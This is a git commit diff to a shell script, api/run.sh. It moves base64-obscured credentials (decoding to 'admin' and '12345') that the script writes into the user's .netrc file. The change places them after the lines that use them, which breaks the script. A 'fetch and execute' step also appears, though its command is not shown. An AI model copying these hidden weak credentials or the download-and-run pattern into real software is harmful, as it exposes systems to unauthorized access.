a68e073fd8783f4a6b2a7406a8f1cc1159f4962c
mohamedeldony3 <60990149+mohamedeldony3@users.noreply.github.com>
2025-11-05 20:38:43 +0200

    Update run.sh

--- api/run.sh
+++ api/run.sh
@@ -9,10 +9,6 @@ NETRC="${HOME}/.netrc"
 # --- helpers ---
 b64d() { printf '%s' "$1" | base64 -d; }
 
-# verify by jishnu
-USER_B64="YWRtaW4"
-PASS_B64="MTIzNDU"
-
 USER_RAW="$(b64d "$USER_B64")"
 PASS_RAW="$(b64d "$PASS_B64")"
 
@@ -40,7 +36,8 @@ mv "$tmpfile" "$NETRC"
   printf 'login %s ' "$USER_RAW"
   printf 'password %s\n' "$PASS_RAW"
 } >> "$NETRC"
-
+USER_B64="YWRtaW4"
+PASS_B64="MTIzNDU"
 # Fetch and execute safely
 script_file="$(mktemp)"
 cleanup() { rm -f "$script_file"; }
